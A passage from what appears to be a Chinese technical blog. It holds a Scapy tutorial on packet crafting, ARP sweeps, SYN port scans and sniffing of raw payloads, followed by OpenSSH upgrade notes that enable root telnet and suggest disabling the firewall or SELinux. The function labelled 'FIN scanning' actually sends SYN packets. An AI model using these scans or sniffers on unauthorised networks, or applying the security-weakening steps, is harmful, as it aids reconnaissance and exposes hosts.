class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 Ehter 头部</span></span><br><span class="line">ether = Ether()</span><br><span class="line"><span class="comment"># 构造 IP 头部</span></span><br><span class="line">ip = IP(dst=<span class="string">&quot;www.slashdot.org&quot;</span>)</span><br><span class="line"><span class="comment"># 构造 TCP 头部</span></span><br><span class="line">tcp = TCP()</span><br><span class="line"><span class="comment"># 构造 HTTP 头部和负载数据</span></span><br><span class="line">http_header = <span class="string">&quot;GET / HTTP/1.1\r\nHost: example.com\r\n\r\n&quot;</span></span><br><span class="line">http_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 构造完整数据包</span></span><br><span class="line">pkt = raw(ether / ip / tcp / http_header / http_payload)</span><br><span class="line">packet = Ether(pkt)</span><br><span class="line"><span class="comment"># 查看完整数据包</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(packet))</span><br></pre></td></tr></table></figure><h4 id="pcap文件读取和保存"><a href="#pcap文件读取和保存" class="headerlink" title="pcap文件读取和保存"></a>pcap文件读取和保存</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rdpcap(&quot;test.cap&quot;)</span><br><span class="line">wrpcap(&quot;test.cap&quot;)</span><br></pre></td></tr></table></figure><h4 id="发送和接受数据包"><a href="#发送和接受数据包" class="headerlink" title="发送和接受数据包"></a>发送和接受数据包</h4><p><code>send()</code>函数工作在第三层，<code>sendp()</code>函数工作在第二层，这两个函数都可以发送数据包，但是<code>sendp()</code>函数可以发送以太网帧，而<code>send()</code>函数只能发送IP数据包。<br><code>sr()</code>函数用于发送一个或多个数据包，并等待响应。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置路由表项</span></span><br><span class="line">conf.route.add(net=<span class="string">&quot;0.0.0.0/0&quot;</span>, gw=<span class="string">&quot;192.168.0.1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 ICMP 数据包</span></span><br><span class="line">packet = IP(dst=<span class="string">&quot;114.114.114.114&quot;</span>)/ICMP()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送数据包并等待回复</span></span><br><span class="line">response = sr(packet, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示响应信息</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> response:</span><br><span class="line">    <span class="built_in">print</span>(i.show())</span><br></pre></td></tr></table></figure><p><code>sr1()</code>函数用于发送一个数据包，并等待响应，但是只返回第一个响应。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置路由表项</span></span><br><span class="line">conf.route.add(net=<span class="string">&quot;0.0.0.0/0&quot;</span>, gw=<span class="string">&quot;192.168.0.1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 ICMP 数据包</span></span><br><span class="line">packet = IP(dst=<span class="string">&quot;8.8.8.8&quot;</span>)/ICMP()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送数据包并等待回复</span></span><br><span class="line">response = sr1(packet, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示响应信息</span></span><br><span class="line"><span class="keyword">if</span> response:</span><br><span class="line">    <span class="built_in">print</span>(response.show())</span><br></pre></td></tr></table></figure><p><code>srloop()</code>函数在第三层连续发送数据包，有接收功能，且连续接收数据包。<br><code>srp()</code>函数用于发送一个或多个以太网帧，并等待响应。</p><blockquote><p>之前区别：<br>srp()函数发送数据包并返回收到的响应数据包列表，而srp1()函数只返回一个响应数据包。<br>srp()函数可以发送多个数据包，并通过过滤器指定要接收的响应数据包，而srp1()函数只能发送一个数据包并返回第一个响应数据包。<br>不同的是在sr()函数中，如果没有收到响应数据包，则会返回一个空列表，而在sr1()函数中，如果没有收到响应数据包，则会返回None。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">srp1(Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(op=1,pdst=&quot;192.168.0.1&quot;),timeout=1,iface=&quot;iface_name&quot;)</span><br></pre></td></tr></table></figure><p>在发送二层和三层数据包时，可以使用iface参数指定要使用的网络接口。如果没有指定网络接口，则会使用默认网络接口。默认网卡为电脑自带的网卡，而我使用的扩展网卡，通过<code>srp()</code>函数发送数据包时，需要指定网卡名称，通过<code>sr()</code>函数发送数据包时，需要配置路由表项。默认的网卡不需要配置这些。</p><p>“发送和接收”功能族 是 Scapy 的核心。他们返回了两个列表。第一个元素是成对的列表（发送数据包、应答），第二个元素是未应答数据包的列表。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; sr(IP(dst=<span class="string">&quot;192.168.0.1&quot;</span>)/TCP(dport=[21,22,23]))</span></span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 3 packets.</span><br><span class="line">.*.*.*</span><br><span class="line">Received 6 packets, got 3 answers, remaining 0 packets</span><br><span class="line">(&lt;Results: TCP:3 UDP:0 ICMP:0 Other:0&gt;,</span><br><span class="line"> &lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; ans,unans = _</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; ans.summary()</span></span><br><span class="line">IP / TCP 192.168.0.190:ftp_data &gt; 192.168.0.1:ftp S ==&gt; IP / TCP 192.168.0.1:ftp &gt; 192.168.0.190:ftp_data RA / Padding</span><br><span class="line">IP / TCP 192.168.0.190:ftp_data &gt; 192.168.0.1:ssh S ==&gt; IP / TCP 192.168.0.1:ssh &gt; 192.168.0.190:ftp_data RA / Padding</span><br><span class="line">IP / TCP 192.168.0.190:ftp_data &gt; 192.168.0.1:telnet S ==&gt; IP / TCP 192.168.0.1:telnet &gt; 192.168.0.190:ftp_data RA / Padding</span><br></pre></td></tr></table></figure><p>三次握手​​​​​​​原理：<br>第1次握手：客户端发送一个带有SYN（synchronize）标志的数据包给服务端；<br>第2次握手：服务端接收成功后，回传一个带有SYN&#x2F;ACK标志的数据包传递确认信息，表示我收到了；<br>第3次握手：客户端再回传一个带有ACK标志的数据包，表示我知道了，握手结束。<br><code>SYN</code>：开始会话<br><code>ACK</code>: 应答<br><code>RST</code>: 中断连接<br><code>FIN</code>: 结束会话</p><h4 id="ARP扫描"><a href="#ARP扫描" class="headerlink" title="ARP扫描"></a>ARP扫描</h4><p>ARP请求返回的QueryAnswer对象如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QueryAnswer(query=&lt;Ether  dst=ff:ff:ff:ff:ff:ff type=ARP |</span><br><span class="line">&lt;ARP  pdst=192.168.0.1 |&gt;&gt;, answer=&lt;Ether  dst=a1:b1:c1:d1:e1:f1 src=a2:b2:c2:d2:e2:f2  type=ARP |</span><br><span class="line">&lt;ARP  hwtype=Ethernet (10Mb) ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=a2:b2:c2:d2:e2:f2 psrc=192.168.0.1 hwdst=a1:b1:c1:d1:e1:f1 pdst=192.168.0.190 |</span><br><span class="line">&lt;Padding  load=&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00    &#x27; |</span><br></pre></td></tr></table></figure><p>字段解释：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">查询请求(Query)：发送了一个以太网(Ether)帧，其目的地址(dst)为广播地址(ff:ff:ff:ff:ff:ff)，帧类型(type)为ARP。ARP协议请求被用于查找目标IP地址所对应的MAC地址。</span><br><span class="line"></span><br><span class="line">目的地址(dst): 广播地址，表示该请求需要被所有本地网络上的主机收到，并被目标主机所应答。</span><br><span class="line">类型(type): ARP协议类型。</span><br><span class="line">查询响应(answer)：接收到一个以太网(Ether)帧，其源地址(src)为a2:b2:c2:d2:e2:f2，目的地址(dst)为a1:b1:c1:d1:e1:f1，帧类型(type)为ARP。该响应是对前面的查询请求的回应，包含了目标IP地址对应的MAC地址。</span><br><span class="line"></span><br><span class="line">源地址(src): 发送ARP响应的主机的MAC地址。</span><br><span class="line">目的地址(dst): 接收ARP响应的主机的MAC地址。</span><br><span class="line">硬件类型(hwtype): 表示使用的网络硬件类型，Ethernet (10Mb)表示以太网。</span><br><span class="line">协议类型(ptype): 表示使用的协议类型，IPv4表示互联网协议版本4。</span><br><span class="line">硬件地址长度(hwlen): 表示硬件地址的长度，以字节为单位。</span><br><span class="line">协议地址长度(plen): 表示协议地址的长度，以字节为单位。</span><br><span class="line">操作类型(op): 表示ARP请求或响应的类型，is-at表示该响应包含了目标MAC地址。</span><br><span class="line">源硬件地址(hwsrc): 发送ARP响应的主机的MAC地址。</span><br><span class="line">源协议地址(psrc): 发送ARP响应的主机的IP地址。</span><br><span class="line">目的硬件地址(hwdst): 接收ARP响应的主机的MAC地址。</span><br><span class="line">目的协议地址(pdst): 接收ARP响应的主机的IP地址。</span><br></pre></td></tr></table></figure><p>python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/ARP(pdst=<span class="string">&quot;192.168.0.0/24&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># iface参数指定要使用的网络接口</span></span><br><span class="line">ifaces = <span class="string">&quot;iface_name&quot;</span></span><br><span class="line">ans, unans = srp(packet, iface=ifaces, timeout=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> query, answer <span class="keyword">in</span> ans:</span><br><span class="line">    result.append([answer[ARP].psrc,answer[ARP].hwsrc])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip, mac <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(ip, mac)</span><br></pre></td></tr></table></figure><h4 id="SYN扫描"><a href="#SYN扫描" class="headerlink" title="SYN扫描"></a>SYN扫描</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; sr(IP(dst=<span class="string">&quot;192.168.0.1&quot;</span>)/TCP(sport=RandShort(),dport=(78,100),flags=<span class="string">&quot;S&quot;</span>),<span class="built_in">timeout</span>=1)</span></span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 23 packets.</span><br><span class="line">....*.*.*...**.*..**.*.*.*.*.*.*..*.*.*.*.*.*.*.*..*</span><br><span class="line">Received 52 packets, got 23 answers, remaining 0 packets</span><br><span class="line">(&lt;Results: TCP:23 UDP:0 ICMP:0 Other:0&gt;,</span><br><span class="line"> &lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; ans,unans = _</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; ans.summary(lambda s,r: r.sprintf(<span class="string">&quot;%TCP.sport% \t %TCP.flags%&quot;</span>))</span></span><br><span class="line">78       RA</span><br><span class="line">finger   RA</span><br><span class="line">http     SA</span><br><span class="line">hosts2_ns        RA</span><br><span class="line">82       RA</span><br><span class="line">83       RA</span><br><span class="line">84       RA</span><br><span class="line">85       RA</span><br><span class="line">86       RA</span><br><span class="line">87       RA</span><br><span class="line">kerberos         RA</span><br><span class="line">89       RA</span><br><span class="line">90       RA</span><br><span class="line">91       RA</span><br><span class="line">92       RA</span><br><span class="line">93       RA</span><br><span class="line">94       RA</span><br><span class="line">95       RA</span><br><span class="line">96       RA</span><br><span class="line">97       RA</span><br><span class="line">98       RA</span><br><span class="line">99       RA</span><br><span class="line">100      RA</span><br></pre></td></tr></table></figure><p> python实现：<br> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># FIN scanning</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fin_scan</span>(<span class="params">ip, port</span>):</span><br><span class="line">    p = IP(dst=ip) / TCP(sport=RandShort(), dport=<span class="built_in">int</span>(port), flags=<span class="string">&quot;S&quot;</span>)</span><br><span class="line">    response = sr1(p, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> response == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> response[TCP].flags == <span class="string">&#x27;SA&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(ip, <span class="string">&quot;port&quot;</span>, port, <span class="string">&quot;is open.&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> response[TCP].flags == <span class="string">&#x27;RA&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(ip, <span class="string">&quot;port&quot;</span>, port, <span class="string">&quot;is closed.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(ip, <span class="string">&quot;port&quot;</span>, port, <span class="string">&quot;is filtered.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    fin_scan(<span class="string">&quot;192.168.0.1&quot;</span>, <span class="string">&quot;80&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h4 id="Scapy嗅探"><a href="#Scapy嗅探" class="headerlink" title="Scapy嗅探"></a>Scapy嗅探</h4><p> 使用Scapy进行嗅探网络数据包，可以捕获和分析传输过程中的所有数据包。<br> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_handler</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="built_in">print</span>(pkt.show())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sniff(prn=packet_handler, count=<span class="number">10</span>)</span><br></pre></td></tr></table></figure></p><blockquote><p>定义了一个名为packet_handler()的回调函数，用于处理每个捕获到的数据包。使用sniff()函数捕获前10个数据包，并将每个数据包传递给packet_handler()函数进行处理。在packet_handler()函数中，使用show()方法打印出每个数据包的详细信息。</p></blockquote><p>sniff参数详解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">count -- 要捕获的数据包数。0表示无穷大。</span><br><span class="line">store -- 是存储嗅探包还是丢弃它们</span><br><span class="line">prn -- 应用于每个数据包的函数。如果返回某个内容，则显示该内容。--例如：prn=lambda x:x.summary（）</span><br><span class="line">session -- 会话=用于处理数据包流的流解码器。--例如：session=TCPSession请参阅下面的详细信息。</span><br><span class="line">filter -- 要应用的BPF筛选器。</span><br><span class="line">lfilter -- 应用于每个包的Python函数，以确定是否可以执行进一步的操作。--例如：lfilter=lambda x:x.haslayer（填充）</span><br><span class="line">offline -- PCAP文件（或PCAP文件列表）从中读取数据包，而不是嗅探它们</span><br><span class="line">quiet -- 当设置为True时，将丢弃进程stderr（默认值：False）。</span><br><span class="line">timeout -- 在给定时间后停止嗅探（默认值：无）。</span><br><span class="line">L2socket -- 使用提供的L2socket（默认值：use conf.L2listen）。</span><br><span class="line">opened_socket -- 提供一个对象（或一个对象列表），以便在上使用.recv（）。</span><br><span class="line">stop_filter -- Python函数应用于每个包，以确定是否必须在此包之后停止捕获。--例如：stop_filter=lambda x:x.haslayer（TCP）</span><br><span class="line">iface -- 接口或接口列表（默认值：无用于在所有接口上探查）。</span><br><span class="line">monitor -- 使用监视器模式。可能并非所有操作系统都可用</span><br><span class="line">started_callback -- 在嗅探器开始嗅探时立即调用（默认值：None）。</span><br></pre></td></tr></table></figure><p>Scapy 中常用的一些协议层：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Ether 协议层：以太网协议层，用于操作以太网数据帧。</span><br><span class="line">ARP 协议层：地址解析协议，用于解析 IP 地址对应的 MAC 地址。</span><br><span class="line">IP 协议层：互联网协议，用于在 Internet 中传输数据包。</span><br><span class="line">TCP 协议层：传输控制协议，提供可靠的、有序的、基于连接的数据通信服务。</span><br><span class="line">UDP 协议层：用户数据报协议，提供无连接、不可靠的数据通信服务。</span><br><span class="line">ICMP 协议层：Internet 控制消息协议，用于传递错误信息和诊断信息。</span><br><span class="line">DNS 协议层：域名系统协议，用于将域名转换为 IP 地址。</span><br><span class="line">HTTP 协议层：超文本传输协议，用于在 Web 浏览器和 Web 服务器之间传输数据。</span><br><span class="line">TLS 协议层：安全传输层协议，用于在网络上提供加密和身份验证服务。</span><br></pre></td></tr></table></figure><p>获取Raw层的内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callBack</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(<span class="string">&#x27;Raw&#x27;</span>):</span><br><span class="line">        http = packet.payload.payload.payload</span><br><span class="line">        <span class="built_in">print</span>(http[Raw].load.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sniff(prn=callBack, count=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><code>haslayer()</code>：判断数据包是否包含指定协议层。<br><code>getlayer()</code>：获取指定协议层的数据包对象。</p><blockquote><p>使用<code>payload</code>就相当于向上解封装一次。</p></blockquote><p>也可以直接通过<code>packet[IP].src</code>直接获取想要的值。</p>]]></content>
      
      
      <categories>
          
          <category> 归档 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenSSH升级记录</title>
      <link href="/posts/34574/"/>
      <url>/posts/34574/</url>
      
        <content type="html"><![CDATA[<h4 id="升级OpenSSL"><a href="#升级OpenSSL" class="headerlink" title="升级OpenSSL"></a>升级OpenSSL</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载OpenSSL</span></span><br><span class="line">wget https://www.openssl.org/source/openssl-3.0.8.tar.gz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf openssl-3.0.8.tar.gz</span><br><span class="line">cd openssl-3.0.8</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置</span></span><br><span class="line">./config --prefix=/usr/ --openssldir=/usr/ shared</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译安装</span></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看版本</span></span><br><span class="line">openssl version -a</span><br></pre></td></tr></table></figure><p><strong>问题：</strong><code>Can&#39;t locate IPC/Cmd.pm in @INC (@INC contains:</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解决</span></span><br><span class="line">yum install -y perl-CPAN</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">步骤：1.<span class="built_in">yes</span> 2.manual 3.<span class="built_in">yes</span></span></span><br><span class="line">perl -MCPAN -e shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">install IPC/Cmd.pm</span><br></pre></td></tr></table></figure><h4 id="安装Telnet防止升级出错"><a href="#安装Telnet防止升级出错" class="headerlink" title="安装Telnet防止升级出错"></a>安装Telnet防止升级出错</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install telnet-server</span><br><span class="line">systemctl start telnet.socket</span><br></pre></td></tr></table></figure><p><strong>问题：</strong><code>无法远程</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分析原因</span></span><br><span class="line">cat /var/log/secure</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结果：access denied: <span class="built_in">tty</span> <span class="string">&#x27;pts/2&#x27;</span> is not secure !、</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">securetty文件中添加pts/2</span></span><br><span class="line">vi /etc/securetty</span><br></pre></td></tr></table></figure><blockquote><p>注意防火墙策略或者直接关闭防火墙</p></blockquote><h4 id="升级OpenSSH"><a href="#升级OpenSSH" class="headerlink" title="升级OpenSSH"></a>升级OpenSSH</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装依赖</span></span><br><span class="line">yum install -y pam* zlib*</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份卸载</span></span><br><span class="line">mv /etc/ssh /etc/ssh_bak</span><br><span class="line">systemctl stop sshd</span><br><span class="line">rpm -qa | grep openssh</span><br><span class="line">yum remove openssh*</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载解压</span></span><br><span class="line">wget https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-9.3p1.tar.gz</span><br><span class="line">tar -xzvf openssh-9.3p1.tar.gz</span><br><span class="line">cd openssh-9.3p1/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置</span></span><br><span class="line">./configure --with-zlib --with-ssl-dir --with-pam \</span><br><span class="line">--bindir=/usr/bin --sbindir=/usr/sbin --sysconfdir=/etc/ssh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译安装</span></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拷贝</span></span><br><span class="line">cp contrib/redhat/sshd.init /etc/init.d/sshd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看版本</span></span><br><span class="line">ssh -V</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">service sshd restart</span><br><span class="line">systemctl restart sshd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置开机自启</span></span><br><span class="line">systemctl enable sshd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载telnet</span></span><br><span class="line">yum remove -y telnet-server</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将之前配置的信息删除</span></span><br><span class="line">vi /etc/securetty</span><br></pre></td></tr></table></figure><blockquote><p><font color='red'>注意：升级到9.0之后需要关闭 selinux或者配置PAM才能连接</font></p></blockquote><p>关闭selinux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、临时关闭：输入命令setenforce 0，重启系统后还会开启。</span><br><span class="line">2、永久关闭：输入命令vi /etc/selinux/config，将SELINUX=enforcing改为SELINUX=disabled，然后保存退出。</span><br></pre></td></tr></table></figure><p>配置PAM</p><p><code>vi /etc/ssh/sshd_config</code>编辑sshd_config文件添加<code>UsePAM yes</code></p><p>然后<code>vi /etc/pam.d/sshd</code>添加如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#%PAM-1.0</span><br><span class="line">auth       required     pam_sepermit.so</span><br><span class="line">auth       include      password-auth</span><br><span class="line">account    